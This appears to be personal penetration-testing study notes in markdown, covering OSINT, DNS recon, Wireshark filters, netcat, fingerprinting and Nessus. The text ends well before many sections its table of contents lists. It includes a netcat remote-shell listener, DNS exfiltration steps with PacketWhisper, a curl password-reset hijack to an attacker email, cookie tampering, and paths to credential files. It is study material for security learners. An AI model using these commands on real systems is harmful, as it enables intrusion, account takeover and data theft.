**Cybersecurity Concepts**

# Table-of-Contents 

- [Table-of-Contents](#table-of-contents)
- [OSINT](#osint)
  - [Sublist3r-DNS-Enumeration](#sublist3r-dns-enumeration)
  - [Passive-Active-Reconnaisance](#passive-active-reconnaisance)
  - [Discovery-Domain-Subdomain](#discovery-domain-subdomain)
- [WIRESHARK](#wireshark)
  - [Sniffing-HTTP-vs-HTTPS](#sniffing-http-vs-https)
  - [PacketWhisper](#packetwhisper)
  - [Egresscheck-Framework](#egresscheck-framework)
- [RDR-Xfreerdp](#rdr-xfreerdp)
- [TOOLS](#tools)
  - [NC-Netcat](#nc-netcat)
  - [Web-Fingerprinting](#web-fingerprinting)
  - [Common-OS-File-locations](#common-os-file-locations)
  - [CUT](#cut)
  - [CURL](#curl)
  - [Base64](#base64)
- [VULN-SCANNERS](#vuln-scanners)
  - [Nessus](#nessus)
- [SCANNING-&-FINGERPRINTING](#scanning--fingerprinting)
  - [Common-Ports](#common-ports)
  - [FPING-Ping-Sweep](#fping-ping-sweep)
  - [NMAP](#nmap)
  - [Rustscan](#rustscan)
- [WEB-ATTACKS](#web-attacks)
  - [HTTP-Verbs](#http-verbs)
    - [Misconfigured-HTTP](#misconfigured-http)
  - [Web-server-Directories-Files](#web-server-directories-files)
    - [FEROXBUSTER](#feroxbuster)
    - [DIRSEARCH](#dirsearch)
    - [GOBUSTER](#gobuster)
    - [FFUF](#ffuf)
    - [DIRBUSTER](#dirbuster)
    - [DIRB](#dirb)
    - [ZAP](#zap)
    - [Burp-Suite](#burp-suite)
  - [XSS](#xss)
    - [Cookie-Stealing](#cookie-stealing)
  - [SQL-Injections](#sql-injections)
    - [Exploiting-SQL-STATEMENTS](#exploiting-sql-statements)
  - [NoSQL-Injections](#nosql-injections)
  - [SQLMAP](#sqlmap)
  - [IDOR](#idor)
  - [XXE](#xxe)
  - [LFI](#lfi)
  - [LOG-Poisoning](#log-poisoning)
  - [PHP-Filters](#php-filters)
  - [RFI](#rfi)
  - [SSRF](#ssrf)
  - [CSRF](#csrf)
  - [Command-Injection-Vulnerabilities](#command-injection-vulnerabilities)
  - [Insecure-Deserialisation](#insecure-deserialisation)
  - [File-Upload-Filtering](#file-upload-filtering)
    - [Bypassing-Client-side-filtering](#bypassing-client-side-filtering)
    - [Bypassing-Server-side-filtering](#bypassing-server-side-filtering)
  - [JWT](#jwt)
  - [SSTI](#ssti)
  - [Log4Shell](#log4shell)
  - [Wordpress](#wordpress)
  - [Jenkins](#jenkins)
- [SYSTEM-ATTACKS](#system-attacks)
  - [Malware](#malware)
  - [Password-Attacks](#password-attacks)
    - [John-The-Ripper](#john-the-ripper)
    - [Hashcat](#hashcat)
  - [Hashes-Passwords](#hashes-passwords)
    - [Windows-Hashes](#windows-hashes)
    - [Linux-Hashes](#linux-hashes)
  - [Buffer-Overflow](#buffer-overflow)
    - [Seven-Steps-To-Buffer-Overflow:](#seven-steps-to-buffer-overflow)
    - [Buffer-Overflow-Code](#buffer-overflow-code)
  - [SMTP-Exploitation](#smtp-exploitation)
- [NETWORK-ATTACKS](#network-attacks)
  - [ROUTING](#routing)
  - [HYDRA](#hydra)
  - [SMB-SAMBA-Shares](#smb-samba-shares)
    - [Windows-Shares](#windows-shares)
  - [CrackMapExec](#crackmapexec)
  - [SMBclient](#smbclient)
  - [Enum4Linux](#enum4linux)
  - [Nmblookup](#nmblookup)
  - [NBTSTAT-NET-VIEW](#nbtstat-net-view)
  - [Null-Sessions](#null-sessions)
    - [Exploiting-NULL-Sessions](#exploiting-null-sessions)
  - [ARP-Poisoning](#arp-poisoning)
    - [MAC-Flooding-Spoofing](#mac-flooding-spoofing)
  - [ARPspoof](#arpspoof)
  - [Metasploit](#metasploit)
  - [Impacket](#impacket)
    - [PSExec](#psexec)
  - [Port-Forwarding-Tunnelling](#port-forwarding-tunnelling)
  - [SOCAT-Tool](#socat-tool)
- [SHELLS-FIND](#shells-find)
  - [Spawn-Stabilise-Shell](#spawn-stabilise-shell)
  - [Shell-Meterpreter](#shell-meterpreter)
  - [Shell-NETCAT](#shell-netcat)
  - [Shell-CMD](#shell-cmd)
  - [Shell-PowerShell](#shell-powershell)
  - [Shell-Linux-SSH](#shell-linux-ssh)
  - [Shell-Telnet](#shell-telnet)
  - [Shell-SMB](#shell-smb)
  - [Shell-FTP](#shell-ftp)
  - [SHELL-mySQL](#shell-mysql)
- [PAYLOADS-SHELLS](#payloads-shells)
  - [Common-Shell-Payloads](#common-shell-payloads)
  - [Msfvenom](#msfvenom)
  - [Webshells](#webshells)
  - [ZEROLOGON](#zerologon)
- [DATABASES](#databases)
  - [MySQL](#mysql)
  - [NoSQL](#nosql)
  - [MSSQL](#mssql)
- [Active-Directory](#active-directory)
  - [KERBEROS](#kerberos)
    - [Kerbrute](#kerbrute)
    - [Asrep-Roast:](#asrep-roast)
    - [Kerberos-Roast](#kerberos-roast)
    - [Winrm](#winrm)
    - [Evil-Winrm](#evil-winrm)
    - [Rubeus](#rubeus)
    - [Mimikatz](#mimikatz)
      - [Golden-Silver-Tickets](#golden-silver-tickets)
      - [Kerberos-Backdoor](#kerberos-backdoor)
  - [POWERVIEW](#powerview)
  - [BLOODHOUND](#bloodhound)
- [Linux-Privilege-Escalation](#linux-privilege-escalation)
  - [linPEAS](#linpeas)
  - [SSH-Private-Public-Keys](#ssh-private-public-keys)
  - [Weak-File-Permissions](#weak-file-permissions)
  - [Sudo-Shell-Escapes](#sudo-shell-escapes)
  - [Sudo-Variables](#sudo-variables)
  - [Kernel-Exploitation](#kernel-exploitation)
  - [NMAP-Root-Shell](#nmap-root-shell)
  - [SUID-or-SGID](#suid-or-sgid)
  - [Capabilities](#capabilities)
  - [Cron-Jobs](#cron-jobs)
  - [$PATH](#path)
  - [Service-Exploits](#service-exploits)
  - [NFS-Network-File-Sharing](#nfs-network-file-sharing)
  - [Passwords-and-Keys](#passwords-and-keys)
- [Windows-Privilege-Escalation](#windows-privilege-escalation)
  - [Info-Gathering](#info-gathering)
  - [WinPEAS-PowerUp](#winpeas-powerup)
  - [Windows-Exploit-Suggester](#windows-exploit-suggester)
  - [Vulnerable-Software](#vulnerable-software)
  - [DLL-Hijacking](#dll-hijacking)
  - [Unquoted-Service-Path](#unquoted-service-path)
  - [Quick-Wins](#quick-wins)
  - [Registry](#registry)
  - [Pass-The-Ticket](#pass-the-ticket)
  - [Token Impersonation](#token-impersonation)
  - [Applocker Bypass](#applocker-bypass)
- [Working-with-Exploits](#working-with-exploits)
  - [Linux-Exploits](#linux-exploits)

------------------------------------------------------------------------------------------------------------------------------------------------------

# OSINT

------------------------------------------------------------------------------------------------------------------------------------------------------

OSINT is the practice of using publicly available information from a variety of different sources. If you pay attention and think about the kill chain; within the killchain the **reconnaissance** step is arguably the most important step as this is the level where the target starts painting the picture of where the vulnerabilities may lie and starts guiding the attack that is later used.

> - Information on network equipment
> - Employee email addresses
> - Social media pages

The OSINT process starts from what you know on the target

**What you know about the target**

 > - such as company or name

**Define Goals and what we want i.e user credentials**

 > - We know we need an email address and possibly social media accounts if we are preparing for a spear phishing campaign 

**Collect data using various tools**

**OSINT - Maltego**
  
  > - Extremely powerful visualisation of information gathered about a target and the 'links' to get to that information

**OSINT - theHarvester**

  > - not so much visualisation however able to gather a lot of information really quickly
  > - within shell: `theHarvester -d some_company_website -b linkedin`
  > - Result: list of names, job titles of each user that is associated (work) with some_company_website on linkedin
  > - can then pivot and use `netcraft` to get a full list of names and ip address that are publicly listed without ever needing to touch the target
  > - Can also integrate google dork and shodan within these searches

**OSINT - Spiderfoot**

  > - Consolidates 100's of data feeds into a single search. Queries similar to google on all public OSINT sources available to get data on the target.
  > - As easy as typing in something we know about the target such as `username` and finding out a whole bunch of information on that. 
  > - Allows you to select what kind of queries you want to do; passive, investigate, footprint or all. 
   > - Passive won't send any direct queries on the target

**OSINT Framework** [osintframework](https://osintframework.com/)

  > - Powerful list of links that will be useful for your investigation
  > - This visualisation also allows you to navigate easily to target specific information

**OSINT - Github Search Function**

  > - Company names or websites to try and locate relevant repositories to the target
  > - Discover source code, passwords or other content not found yet

**OSINT - Google Hacking/Dorking**

|                                           | Description                  |
|:----------------------------------------- |:---------------------------- |
| Site:tryhackme.com                        | filter by site               |
| -site:tryhackme.com site:\*.tryhackme.com | Filter by subdomains only    |
| inurl:admin                               | filter by word **in url**    |
| filetype:pdf                              | filter by filetype extension |
| intitle:admin                             | filter by work **in title**  |

**OSINT - S3 Buckets**

Storage service provided by amazon AWS, allowing saving of files or static website content in the cloud; sometimes with incorrectly set permissions such as private, public or writable.\
Format: http(s)://{name}.s3.amazonaws.com

  > - {name} is set by owner

One common occurrence is usually the company name followed by common terms; {name}-assets, {name}-www, {name}-public, {name}-private, etc

**OSINT - SSL/TLS Certificates**

These certificates are created by a Certificate Authority who takes part in Certification Transparency Logs. These logs are to determine and stop malicious use or accidentally made certificates.\
Since these Certification transparency logs are public, we can use this for our OSINT gathering by using the following website search functions:

> - https://crt.sh
> - https://transparencyreport.google.com/https/certificates

[Back to Top](#table-of-contents)

--------------------------------------------

## Sublist3r-DNS-Enumeration 

Tool used to automate the steps to either bruteforce or discover all DNS or subdomains of the target website to discover all the various websites related to the target.

```powershell
#SYNTAX
$FILE      :Saved to file
$DOMAIN    :Target i.e yahoo.com
-v         :Verbosity
-t 40      :Thread count setting
-d $DOMAIN :Target Domain

sublist3r -v -t 40 -o $FILE -d $RHOST
```

[Back to Top](#table-of-contents)

--------------------------------------------

## Passive-Active-Reconnaisance

**Passive Reconnaisance** is usually defined as being done in a manner that is stealthy or without directly interacting with the target.\
This is the first step in understanding your target without notifying them that you are targeting them.

> - **whois**: to query WHOIS server records
> - **nslookup**: to query DNS server records
> - **dig**: to query DNS server records
> - **[DNSdumpster](https://dnsdumpster.com/)**: Online service
> - **[Shodan.io](https://www.shodan.io/)**: Online service

```powershell
#NSLOOKUP
$DOMAIN    :Domain i.e yahoo.com
$DNS       :DNS server IP

nslookup $DOMAIN $DNS
nslookup tryhackme.com 8.8.8.8
nslookup -type=A $DOMAIN           :Or -type=AAAA
nslookup -type=MX $DOMAIN

#WHOIS
whois $DOMAIN

#DIG
dig $DNS $DOMAIN $OPTION         :'txt' or 'mx' options etc
dig @8.8.8.8 tryhackme.com TXT
```

**Active Reconnaisance** is when you are actively enumerating and discovering resources/information from the target.\
You may not be doing any thing noisy but you start having a footprint.


> - **traceroute**: Trace the route that a packet takes. Informs the hops(routes) and usually the number of routes between two systems
> - **ping**: Send ICMP packets and receive ICMP ECHO replies. ICMP header byte size is 8bits. Packets sent is 64bits and you can specify size or Time-to-Live
> - **telnet**: Telnet can bannergrab on any open service through connection. I.e webservice on port 80 you can `telnet {ip address} {port}` then proceed to send a `GET / HTTP/1.1` request `host: telnet`
> - **nc**: netcat also supports banner grabbing with `nc {ip address} {port}`

```powershell
#PING
-c $AMT      :Number of ICMP packets sent i.e 2, default ping runs infinitely until told to stop
$RHOST       :Target
ping -c $AMT $RHOST       

#TRACEROUTE
traceroute $RHOST    :Linux
tracert $RHOST       :Windows
```

[Back to Top](#table-of-contents)

-----

## Discovery-Domain-Subdomain

Tags: [Sublist3r-DNS-Enumeration](#Sublist3r-DNS-Enumeration)

It is common to test and search the webapp to see what kind of information and access you can get or what paths you are allowed to access as well as what information is embedded in those paths or pages

By viewing source, you can explore the html code and see what kind of sensitive or interesting data might be left over and might lead to clues to another vector.

Using open source resources to do your discovery is a great way of understanding the business essentials while **widening your attack surface** and doing so *without actively interacting with the target*

> - Google search `site:company.com` will index pages that often *might not meant to be indexed* allowing discovery of target **subdomains**
> - *dnsdumpster.com* **passively** utilises data from google-indexed subdomains but also checks additional sites such as Bing and Virustotal
> - <*[Sublist3r](https://github.com/aboul3la/Sublist3r)*>, Github tool, using osint info to enumerate on subdomains of websites using various search engines
  > - **Easily blocked by google** as the search engine does not like automated tools
  > - ![](https://i.imgur.com/lflAtZA.png)
  

------------------------------------------------------------------------------------------------------------------------------------------------------


# WIRESHARK

------------------------------------------------------------------------------------------------------------------------------------------------------

**Wireshark** is a network sniffer tool that lets you see and monitor data sent back and forth over the network. This monitoring of traffic is power as it allows you gain information regarding the connection packets sent when you interact with a destination server.

> - Captures all traffic **seen** by the network card NIC - Network Interface Cards
> - Network cards can work in:
  > - promiscuous mode
  > - monitor mode

**Mode 1: Monitor Mode****

Network card **discards** any packet addressed to another Network interface.

> In a hub based network Network interface card normally drops these packets but **accepts them** while in promiscuous mode
 

**Mode 2: Promiscuous Mode****

A network card will **accept** and process **any** packet it receives.

> - e.g Hub based network, NIC receives traffic addressed to **other** machines 
> - NIC normally drops these packets but **accepts them** while in promiscuous mode

With switched networks, sniffing is more difficult and requires ARP poisoning or MAC flooding to succeed.

```powershell
#WIRESHARK FILTERS
ip                                      :filter **IP** as layer 3 protocol
not ip                                  :**Inverse** filtering
tcp or udp                              :filters by specific types of packages
tcp.port==3389                          :**Ports**
not tcp.port==3389                      :**Ports**
ip.addr == 192.168.99.22                :Network ip or network `0/24` in cidr notation
ip.addr == 192.168.99.22 or arp         :filters IP or APR packets
http                                    :**HTTP**
http.request.method == GET              :
dns.qry.type == 16                      :Filter DNS query to TXT  [Wiki](https://en.wikipedia.org/wiki/List_of_DNS_record_types)
ftp-data

#EXAMPLES
tcp contains youtube                    :Filter specific address
http contains google.com                :Filter HTTP packets with domain name
```

[Back to Top](#table-of-contents)


------------------------------------------------------------------------------------------------------------------------------------------------------


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Sniffing-HTTP-vs-HTTPS

------------------------------------------------------------------------------------------------------------------------------------------------------

Tags: [WIRESHARK](#WIRESHARK)

This is especially important when dealing with HTTP and HTTPS servers and the security features. If a **man in the middle** attacker is able to sniff the traffic on our network and we were to enter a HTTP website with our credentials; the network sniffer would be able to see the successful login and actually capture your username and password directly. This is one of the examples why you don't want to send sensitive information through clear-text protocols.

Alternatively when going through HTTPS you will be able to see that the data packets and the contents are jumbled. The encrypted data is not readable to someone who has intercepted the data.

**Example of using HTTP to authenticate and wireshark to follow the TCP stream:**

![](Obsidian_GGjoT3rXKd.png)

**Example of attempting the same through HTTPS:**

![](Obsidian_Yvc6c1o5GO.png)

As you can see, the results are unreadable due to the encryption through using HTTPS.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## PacketWhisper

Tags: [WIRESHARK](#WIRESHARK), 

PacketWhisper is a python tool that can be used to exfiltrate and transfer interesting files or data through DNS **from the remote desktop** and **onto your own host**. It will *encrypt* and break the file up into  which is sent over the network through the outbound ports and then the host will be using WireShark to sniff the traffic that is being sent over the network; This traffic can then be combined into a file and converted back into the *interesting file* such a password.txt.

**NOTE:**

$Attacker$

> - `python -m SimpleHTTPServer $LPORT`
> - `wireshark` - Capture DNS traffic & save $FILE.pcap 
> - `mv $FILE.pcap $packetWhisperDIR`
> - `python packetWhisper.py`
> - Extract File from $FILE.pcap

$Target$

> - `python -version` 
> - `wget "$RHOST:$RPORT/$packetWhisper.py"`
> - `copy $FILEPATH $PacketWhisperDIR`
> - Change Internet DNS Settings to `$RHOST:$RPORT`
> - `python packetWhisper.py`
> - Send File over DNS:- Options - DNS Transmit, Random Subdomains, Cloudfront cipher, Half-second delay

![](https://i.imgur.com/iDKaPQY.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Egresscheck-Framework

Tags: [WIRESHARK](#WIRESHARK)

Automate the enumeration of searching ports and outbound connectivity or ports that were missed. Using the python tool we are **generating a script or powershell/cmdline isntruction** with set details that we will copy and paste directly into the remote desktop session. This tool is used on your personal host to generate the instructions; then the script is ran on the target host.

This will automate the **firewall** **assessment** to check for **outbound allowed ports**.

$Attacker$

> - `./ecf.py`
> - Set options
> - `generate powershell-cmd` to generate `.bat` file
> - `python -m SimpleHTTPServer $LPORT`
> - `wireshark`

$Target$

> - `python -version` 
> - `wget "$RHOST:$RPORT/$FILE.bat"`
> - ensure `wireshark` is running on LHOST before running `$FILE.bat`

|                                                                 | Description                                                                                             |
|:--------------------------------------------------------------- |:------------------------------------------------------------------------------------------------------- |
| @ **Egresscheck Setup**                                         | ---                                                                                                     |
| `cd /etc/opt/server`                                            | select location for program                                                                             |
| `git clone https://github.com/stufus/egresscheck-framework.git` | download file to current directory (your choice)                                                        |
|                                                                 |                                                                                                         |
| =========================================                       | =========================================                                                               |
| @ **Options**                                                   | ---                                                                                                     |
| `get`                                                           | **display all options** that can be amended                                                             |
| `set PORTS $PORT - $PORT`                                       | set range of ports to test                                                                              |
| `set targetip $RHOST`                                           | Running script from remote desktop, Host is the target IP                                               |
| `set sourceip $LHOST`                                           | The host IP that the file will be run on                                                                |
| `set PROTOCOL $PROTOCOL`                                        | TCP or UDP                                                                                              |
| `generate powershell-cmd`                                       | ecf will generate an encrypted command for powershell to run when executing the .bat file               |
| `wireshark`                                                     | Run wireshark on $LHOST to listen to traffic                                                              |

**Example of type of scripts to generate**

![](https://i.imgur.com/l8YQeOt.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# RDR-Xfreerdp

Remote connecting to a desktop and then running internal checks for what tools would be available and what information you can gather.

**XFREERDP:**

```
/u:$USER: username
/p:$PASS: Password
/v:$RHOST: Target IP
/dynamic-resolution
/f: toggle fullscreen mode
fullscreen: ctrl + alt + enter
```

> - `xfreerdp /f /u:$USER /p:$PASS /v:$RHOST`

|                                                                               | Description                                                                                                               |
|:----------------------------------------------------------------------------- |:------------------------------------------------------------------------------------------------------------------------- |
| @ **Syntax**                                                                  | ---                                                                                                                       |
| `rdesktop $RHOST:$RPORT`                                                      | Linux, launches remote desktop tool on the target IP. If connection established then can prompt to login with credentials |
| `xfreerdp /u:$USER /p:$PASS /v:$RHOST`                                        | using xfreerdp                                                                                                            |
|                                                                               |                                                                                                                           |
| @ **Info Gathering on RHOST**                                                 | ---                                                                                                                       |
| `python --version`                                                            | Using CMD or Powershell: Checking if **python** is available and usable (if it's allowed)                                 |
| `powershell ls`                                                               | Using CMD: Checking if **powershell** is available and usable (if it's allowed)                                           |
| `cd \` then `dir /s /b $FILE`                                                 | **CMD**: searching for common files or interesting files                                                                  |
| `Get-Childitem –Path C:\ -force -Recurse -ErrorAction SilentlyContinue $FILE` | **Powershell**: searching within powershell                                                                               |
|                                                                               |                                                                                                                           |
| @ **Options**                                                                 | ---                                                                                                                       |
| `cd \`                                                                        | head to root of folder tree `c:\` in order to recursively search through folders and subfolders                           |
| Using CMD`dir /s /b $FILE`                                                    | `/s` for searching Every occurrence of specified filename, `/b` combo to reduce fluff                                     |
| Using powershell `-include $FILE/$EXTENSION` or `exclude $FILE/$EXTENSION`    | Include and exclude *.txt or *.json or credentials.* etc                                                                  |
| Using powershell `-force`                                                     | To include hidden files/folders as part of search                                                                         |
| =========================================                                     | =========================================                                                                                 |

**CHECKING OUTBOUND PORTS FROM RHOST:**

|                                                           | Description                                                                                                                                                    |
|:--------------------------------------------------------- |:-------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| @ **TCP Checking - Linux Host Operations**                | ---                                                                                                                                                            |
| ` cd /tmp`                                                | To open  directory into /tmp where you will run HTTP server from                                                                                               |
| `python -m SimpleHTTPServer $LPORT`                       | Setup a simple server on your linux dist, selecting port 1-65536                                                                                               |
| `ifconfig`                                                | identify your host ip address for `host_ip:http_port` pair                                                                                                     |
|                                                           |                                                                                                                                                                |
| @ **Remote Desktop Operations**                           | ---                                                                                                                                                            |
| `http://$LHOST:$LPORT$`                                   | Checking TCP ports, in **browser**: Navigate on rdesktop with the browser and check if there is access to this port indicating outbound port allowed             |
|                                                           |                                                                                                                                                                |
| =========================================                 | =========================================                                                                                                                      |
| @ **UDP Checking - Linux Host Operations**                | Only applicable with virtualisation restrictions, see NOTES below                                                                                              |
| `cd /tmp`                                                 | open directory into /tmp to run wireshark from                                                                                                                 |
| `wireshark`                                               | run wireshark on host, capture traffic on the interface being used i.e **tap0**                                                                                |
| @ **Remote Desktop Operations**                           | ---                                                                                                                                                            |
| > Settings > Network and Sharing > Change Adapter Options |                                                                                                                                                                |
| > Properties > IPv4 Properties                            |                                                                                                                                                                |
| > Preferred DNS `host_ip`                                 | Change DNS settings on Windows target and have your HOST act as the DNS server                                                                                 |
| > Launch into browser to generate packets                 | Refer to wireshark on host computer to review packets, Observe DNS traffic issued by the `target ip` - Indicating Port 53 is allowed **outbound** connectivity |

**NOTES**:

> - Repeat above for all **TCP ports** to manual test
  > - Port: 443, 8443 and so forth
  > - Successful access to `/tmp` folder allows downloading of files and shows open port rules
  > - This method of manual checks is extremely tedious


> - For **UDP** port checks
  > - normally in a real environment launching **Wireshark** you can *sniff* for **DNS requests** originating from the target machine which verifies outbound connectivity with port 53 (UPD)
  > - However in VM's that has virtualisation restrictions
  > - Change *target* DNS settings and configure *host* as DNS server

[Back to Top](#table-of-contents)


------------------------------------------------------------------------------------------------------------------------------------------------------

# TOOLS

------------------------------------------------------------------------------------------------------------------------------------------------------

## NC-Netcat

Relational Tools:\
[[#Common Shell Payloads]], [[#PAYLOADS-SHELLS]], [[#Web-Fingerprinting]], [[#Common-OS-File-locations]]

Versatile tools that has various operations on both TCP & UDP connections or port of choice.\
Among all its versatility, it has the ability to be either a client or a server as well.

**Example of information when connected as client with NC**

![](https://i.imgur.com/ZxqOPTm.png)

|                                              | Description                                                                                                  |
|:-------------------------------------------- |:------------------------------------------------------------------------------------------------------------ |
| @ **Setting up Server host**                 | ---                                                                                                          |
| `nc -$OPTIONS $LPORT $FILEsave`              | Open server, **listening** on target port                                                                    |
| `nc -lvnp $LPORT -e /bin/bash `              | allows executing a command, i.e possible **remote shell**                                                    |
|                                              |                                                                                                              |
| @ **Setting up Client host**                 | ---                                                                                                          |
| `nc -v $LHOST $LPORT`                        | Connection to the host and the listening port                                                                |
| `echo <message_"or"_instruction.txt> <pipe>` | Feed instruction or **message** directly into nc when running command, then **immediately close connection** |
| `cat <sending_file.txt> <pipe> `             | sending a **textfile** and the listening server receiving the transfer                                       |
| =========================================    | =========================================                                                                    |
|                                              |                                                                                                              |
| @ **Options**                                | ---                                                                                                          |
| `-l`                                         | Specify listening                                                                                            |
| `-v`                                         | Specify verbosity of information                                                                             |
| `-p $LPORT`                                  | Specify port                                                                                                 |
| `-u`                                         | Specify UDP connection                                                                                       |
| `-e "/bin/bash"`                             | Executes a program upon a successful connection and allows client to interact with it                        |

**NOTES:**

> - Netcat defaults to TCP connections and requires `-u` to specify UDP connection
> - Possible to spawn a remote shell with netcat using `-e` if the host allows the possibility of executing a single command remotely; then it is possible to use this command to spawn a remote shell

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Web-Fingerprinting

[[#NC-Netcat]]

**FINGERPRINTING TOOLS:**

> - **Netcat** fingerprints only with HTTP requests
> - **OpenSSL** fingerprints with HTTPS requests
> - **HTTPrint** fingerprints using signature-based technique to identify webservers

**WHAT INFO WE GET:**

> - The daemon providing the web server service, *IIS, Apache, nginx etc*
> - Its version
> - The operating system of the machine hosting the server

The following 3 tools are used as examples used with web fingerprinting however its useable in multiple other programs

**NETCAT:**

Banner grabbing is the processes of connecting to a listening daemon and then read the banner it sends back to the client.

> - After connection, send **valid HTTP request** using the **HEAD** verb
  > - **HEAD** requests the header of a resource such as a web page
  > - Note: Every HTTP request has 2 empty lines between header and body of request
> - netcat *does not encrypt* so cannot connect to HTTPS daemon

**HTTPRINT:**

Web server fingerprinting tool that uses a **signature-based technique** to identify web servers

**Example of HTTPrint being used:**

![](https://i.imgur.com/1uo15gY.png)

**OPENSSL:**

OpenSSL can be used to target **web servers** only listening for **HTTPS** connections

> - Establish a connection to a HTTPS service and then send the usual HEAD verb
> - Take note that sysadmins can *customise banners* to make fingerprinting harder for attackers
> - Automatic tools take it a step futher by checking headders ordering in response messages and errors handling

|                                                                       | Desciption                                                                                                 |
|:--------------------------------------------------------------------- |:---------------------------------------------------------------------------------------------------------- |
| @ **Netcat Webapp Fingerprinting**                                    | ---                                                                                                        |
| `nc`                                                                  | launch netcat                                                                                              |
| `HEAD / HTTP/1.0`                                                     | Banner grabbing, prompts to begin packet request with HEAD verb then **hit enter twice for 2 empty lines** |
|                                                                       |                                                                                                            |
| @ **OpenSSL Webapp Fingerprinting**                                   | ---                                                                                                        |
| `openssl s_client -connect $RHOST:$RPORT`                             |                                                                                                            |
| `HEAD / HTTP/1.0`                                                     | Banner grabbing, prompts to begin packet request with HEAD verb then **hit enter twice for 2 empty lines** |
|                                                                       |                                                                                                            |
| @ **HTTPRINT Webapp Fingerprinting**                                  | ---                                                                                                        |
| `httprint -p0 -h $RHOST -s $FILEsignature`                            | Syntax                                                                                                     |
| `httprint -P0 -h 192.168.99.22 -s /usr/share/httprint/signatures.txt` |                                                                                                            |
| `httprint -P0 -h 192.168.99.22`                                       | No signatures txt                                                                                          |
|                                                                       |                                                                                                            |
| @ **HTTPRINT Options**                                                | ---                                                                                                        |
| `p0`                                                                  | avoid pingin the host (most do not respond to ping echo requestes)                                         |
| `-h $RHOST`                                                           | fingerprint a list of hosts. Input accepts a single, additional or range of IP addresses                   |
| `-s $FILEsignature`                                                   | set the signature file to use                                                                              |
| =========================================                             | =========================================                                                                  |


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Common-OS-File-locations

Tags: [Common Shell Payloads](#Common%20Shell%20Payloads)

```powershell
#Common Windows File Locations
    %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt      :Powershell command history, similar to bash
    C:\boot.ini                                                                                        :Contains boot options for cpus with BIOS firmware

#Common Linux File Locations
    /etc/issue`                              :contains a message or 'system identification' to be printed before the login prompt. 
    /etc/profile`                            :controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
    /etc/passwd`                             :has all registered 'user' that has access to a system
    /etc/shadow`                             :contains information about the systems users 'passwords'
    /etc/group`                              :
    /etc/hosts`                              :
    /etc/motd`                               :
    /etc/mysql/my.cnf`                       :
    
    /root/.bash_history`                     :contains the 'history commands for root user'
    /root/.ssh/id_rsa`                       :'Private SSH keys' for a root or any known valid user on the server
    
    /var/log/dmessage`                       :contains global system messages, including the messages that are logged during system startup
    /var/mail/root`                          :all 'emails' for root user
    /var/log/apache2/access.log`             :the 'accessed requests for Apache' webserver
    
    /proc/version`                           :specifies the 'version' of the 'Linux kernel'
    /proc/cmdline`                           :
    /proc/self/environ`                      :
    /proc/[0-9]*/fd/[0-9]*`                  :First number is 'PID' and second is 'FILE DESCRIPTOR'
```

## CUT

|                                   | Description                                                              |
|:--------------------------------- |:------------------------------------------------------------------------ |
| `cut -d ' ' -f 2-`                | Cutting at the delimiter ' ' (space) and only prints the field 2 onwards |
| `getent passwd | cut -d ':' -f 1` | Get a list of all users, remove all content after ':' and print field 1  |

[Back to Top](#table-of-contents)

## CURL

**RESET PASSWORD/EMAIL:**

> - `curl 'http://10.10.212.50/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@gmail.com'` Reset email
> - Being able to reset the password and with the PHP array data and amending the internal database to include the new email. If the query string and the POST string are in the same keyname, then the application logic will favor the POST data fields thereby controlling where the email gets sent

|                                                                                    | Description                                                     |
|:---------------------------------------------------------------------------------- |:--------------------------------------------------------------- |
| `curl -xpost <target_url>`                                                         | Sending POST REQUEST with and getting a response from webserver |
| `curl -H "Cookie: logged_in=true; admin=false" http://$RHOST/cookie-test`          | Tampering with cookies                                          |
| `curl -X POST http://$RHOST/challenges/chall1.php -d 'method=GET&file=/etc/flag1'` | Sending **POST** request                                        |


[Back to Top](#table-of-contents)

## Base64

**DECODING:**

> - Decode a base64 cookie `echo 'eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ' | base64 -d`
  > - {"id":1,"admin":false}
> - Encode the cookie but **with changed values** `echo '{"id":1,"admin":true}' | base64`
  > - eyJpZCI6MSwiYWRtaW4iOnRydWV9Cg==

|      | Description                                                   |
|:---- |:------------------------------------------------------------- |
|      |                                                               |
| `-d` | decode rather than encode the data                            |
| `-i` | ignore non-alphabetical characters and thereby remove garbage |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# VULN-SCANNERS

------------------------------------------------------------------------------------------------------------------------------------------------------

Sometimes you need to engage and understand what the client would need for their requirements: A pentesting assessment or a vulnerability assessment?

Vulnerability assessments are assessments done based on scans and information but *not performing any exploitation*.\
This is a lighter load on the network as well as there is less risk of adverse impacts.

This does imply that you will not be able to **confirm** the vulnerabilities by testing them and giving proof of their existence.

The assessment is a much more linear movement as opposed to an indepth pentest.

**Example of vulnerability assessment lifecycle:**\

![](https://i.imgur.com/YGM9pmH.png)

Additionally you have the likes of **vulnerability scanners** that use a database of *known* vulnerabilities and security audits to detect.\
**Scanners perform probes on:**
- > daemons listening on TCP and UDP ports
- > configuration files of operating systems, software suites, network devices, etc  
- > Windows registry entries
- > **Purpose is to find vulnerabilities and misconfigurations**

**Example of Scanners such as:**
- > Nessus
- > OpenVAS
- > Nexpose
- > GFI LAN guard
	
[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Nessus

Nessus has a *client* and *server* component. The *client* will configure the scans and the *server* will perform the scanning processes and report back to the client.

|                              | Description                           |
|:---------------------------- |:------------------------------------- |
| `sudo service nessusd start` | starts the nessus service             |
| `https://localhost:8834`     | web browser UI for the nessus service |

**VULNERABILITY SCANNER PROCESS:**

> - Port/ping scanning to determine alive hosts and open ports
> - For every open port found, the scanner will then do a service detection scan
> - For each detected service, the scanner queries the database for known vulnerabilities
